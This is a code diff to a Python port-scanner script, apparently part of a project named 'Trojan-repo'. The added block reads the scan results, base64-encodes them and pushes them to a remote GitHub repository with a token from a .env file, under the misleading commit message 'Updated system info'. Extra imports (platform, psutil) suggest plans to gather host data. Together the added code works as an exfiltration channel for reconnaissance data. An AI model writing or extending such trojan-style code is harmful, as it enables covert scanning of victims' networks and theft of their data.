@@ -1,6 +1,15 @@
 import socket
+import platform
+import psutil
+from datetime import datetime
+import os
+import json
+import requests
+import base64
+import socket
 import threading
 import json
+from dotenv import load_dotenv
 
 class Portscan:
     def __init__(self, timeout=1):
@@ -56,3 +65,55 @@ with open(output_file, "w") as file:
     json.dump({"target_ip": target_ip, "open_ports": open_ports}, file, indent=4)
 
 print(f"Open ports have been saved to {output_file}.")
+
+# Read the content of the output file into a variable
+with open(output_file, "r") as file:
+    data = json.load(file)
+
+# The content of the output file is now stored in the variable 'data'
+print("Data from file:", data)
+
+
+# GitHub repository details
+repository_owner = "BlertaJashanica"
+repository_name = "Trojan-repo"
+file_path = "data/portscan.json"  # Correct file path with filename
+file_content = json.dumps(data, indent=4)  # Convert dict to JSON string for GitHub
+
+load_dotenv()  # Load environment variables from .env file
+github_token = os.getenv("GITHUB_TOKEN")
+
+commit_message = 'Updated system info'
+
+# GitHub API URL
+api_url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/contents/{file_path}"
+headers = {
+    "Authorization": f"Token {github_token}",
+    "Accept": "application/vnd.github.v3+json"
+}
+
+# Encode the file content to Base64
+file_content_encoded = base64.b64encode(file_content.encode()).decode()
+
+# Check if the file already exists
+response = requests.get(api_url, headers=headers)
+if response.status_code == 200:
+    current_file = response.json()
+    sha = current_file["sha"]  # Get the current file's SHA for updates
+else:
+    sha = None  # File doesn't exist; it will be created
+
+# Prepare the payload for the PUT request
+payload = {
+    "message": commit_message,
+    "content": file_content_encoded,
+    "sha": sha
+}
+
+# Push the file to GitHub
+response = requests.put(api_url, json=payload, headers=headers)
+if response.status_code in [200, 201]:
+    print("File pushed successfully!")
+else:
+    print("An error occurred while pushing the file:", response.json())
+
